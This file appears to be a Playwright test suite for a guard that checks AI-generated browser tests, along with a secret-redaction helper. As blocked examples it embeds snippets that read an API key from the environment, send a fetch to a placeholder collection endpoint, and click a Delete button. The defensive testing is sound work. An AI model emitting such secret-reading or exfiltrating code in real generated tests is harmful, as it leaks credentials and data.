import { test, expect } from "@playwright/test";
import { validate } from "../agent/guard";
import { redact } from "../agent/redact";

const safeTest = `
import { test, expect } from '@playwright/test';

test('checks visible content', async ({ page }) => {
  await page.goto('/');
  await expect(page.getByRole('link').first()).toBeVisible();
});
`;

test("guard allows a read-only Playwright test", () => {
  expect(validate(safeTest)).toEqual({ ok: true });
});

test("guard blocks indirect environment access", () => {
  const result = validate(`
import { test, expect } from '@playwright/test';

test('steals secrets', async ({ page }) => {
  const value = process["env"].OPENAI_API_KEY;
  await page.goto('/');
  await expect(page).toHaveTitle(/./);
});
`);

  expect(result.ok).toBe(false);
});

test("guard blocks network exfiltration from generated code", () => {
  const result = validate(`
import { test, expect } from '@playwright/test';

test('exfiltrates', async ({ page }) => {
  await fetch('https://example.test/collect');
  await page.goto('/');
  await expect(page).toHaveTitle(/./);
});
`);

  expect(result.ok).toBe(false);
});

test("guard blocks mutation-style UI actions", () => {
  const result = validate(`
import { test, expect } from '@playwright/test';

test('mutates data', async ({ page }) => {
  await page.goto('/');
  await page.getByRole('button', { name: 'Delete' }).click();
  await expect(page).toHaveTitle(/./);
});
`);

  expect(result.ok).toBe(false);
});

test("guard blocks ambiguous text selector engine locators", () => {
  const result = validate(`
import { test, expect } from '@playwright/test';

test('uses ambiguous text engine', async ({ page }) => {
  await page.goto('/');
  await expect(page.locator('text=new')).toBeVisible();
});
`);

  expect(result.ok).toBe(false);
});

test("guard blocks unscoped short role locators", () => {
  const result = validate(`
import { test, expect } from '@playwright/test';

test('uses short ambiguous role label', async ({ page }) => {
  await page.goto('/');
  await expect(page.getByRole('link', { name: 'new' })).toBeVisible();
});
`);

  expect(result.ok).toBe(false);
});

test("redaction removes common secret shapes", () => {
  const output = redact("Bearer abcdefghijklmnopqrstuvwxyz123456 and user@example.com");

  expect(output).not.toContain("abcdefghijklmnopqrstuvwxyz123456");
  expect(output).not.toContain("user@example.com");
  expect(output).toContain("[REDACTED]");
});
